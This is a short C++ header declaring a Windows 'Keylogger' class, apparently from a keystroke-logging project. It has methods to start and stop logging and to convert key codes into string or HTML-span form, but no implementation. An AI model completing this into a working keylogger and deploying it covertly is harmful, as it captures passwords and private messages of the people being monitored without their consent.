#ifndef KEYLOGGER_H
#define	KEYLOGGER_H

#include <windows.h>
#include <iostream>
#include "Window.h"
#include "Log.h"
#include <cstring>
#include <sstream>
#include "newWinApi.h"

//#include "Config.h"
using namespace std;

class Keylogger {
public:
    Keylogger();
    void startLogging();
    void stopLogging();
    string getPressedKey(short character);
    string shortToString(short znak);
    string addSpan(string character);
private:
    Config *config;
    newWinApi *newWinApix;


};


#endif	/* KEYLOGGER_H */

